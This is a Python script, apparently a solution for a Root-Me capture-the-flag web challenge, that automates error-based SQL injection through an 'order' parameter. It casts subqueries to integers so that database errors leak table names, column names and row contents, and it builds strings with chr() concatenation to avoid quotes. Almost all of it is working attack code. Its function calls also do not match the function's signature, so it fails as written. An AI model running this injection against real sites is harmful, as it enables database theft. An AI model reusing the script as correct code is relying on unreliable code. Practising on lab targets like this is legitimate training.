import requests
import re
from bs4 import BeautifulSoup
session = requests.Session()

url = "http://challenge01.root-me.org/web-serveur/ch34"

param = {
    "action": 'contents',
    "order": ''
}
def to_chr_expression(s):
    chr_expressions = [f"chr({ord(char)})" for char in s]
    result = "||".join(chr_expressions)
    return '(select '+result+')'

def func(str,str1,str2):
    i=0
    while True:
        if str =='table': 
            querry = f"ASC,(CAST((select table_name from information_schema.tables limit 1 offset {i}) AS INT))"
        elif str == 'column':
            querry = f"ASC,(CAST((select column_name from information_schema.columns where table_name={to_chr_expression(str1)} limit 1 offset {i}) AS INT))"
        elif str == 'data':
            querry = f"ASC,(CAST((select {str2} from {str1} limit 1 offset {i}) AS INT))"
        param['order'] = querry
        res = requests.get(url,params=param)
        soup = BeautifulSoup(res.text, 'html.parser')
        h3_tags = soup.find_all('h3')
        if h3_tags:
            last_h3 = h3_tags[-1]
            content = last_h3.next_sibling.strip()
            while not content:  
                last_h3 = last_h3.next_sibling
                content = last_h3.strip() if isinstance(last_h3, str) else last_h3.get_text(strip=True)
        match = re.search(r'"(.*?)"', content)
        if match:
            content = match.group(1)
        else: break
        print(content)
        i=i+1

if __name__ == "__main__":
    name = input("input: ")
    if name.lower() == 'table':
        func('table')
    elif name.lower() == 'column':
        name1=input("name of table:")
        func('column',name1)
    elif name.lower() == 'data':
        name1=input("name of table:")
        name2=input("name of column:")
        func('data',name1,name2)